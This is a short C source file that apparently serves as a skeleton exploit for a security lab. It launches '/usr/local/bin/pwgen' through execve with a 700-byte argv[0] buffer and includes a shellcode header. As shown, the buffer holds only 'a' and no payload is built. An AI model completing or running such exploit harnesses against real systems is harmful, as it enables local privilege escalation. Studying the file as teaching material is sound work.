#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "/usr/local/src/shellcode.h"

#define TARGET "/usr/local/bin/pwgen"

int main(void){
    int i = 0;
    int j = 0;
    char *args[3];
    char *env[1];
    args[1] = "-h";
    args[2] = NULL;
    env[0] = NULL;
    args[0] = malloc(sizeof(char)*700);

	
    args[0][0] = 'a';
	args[0][1] = '\0';
	
    if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");

    exit(0);
}
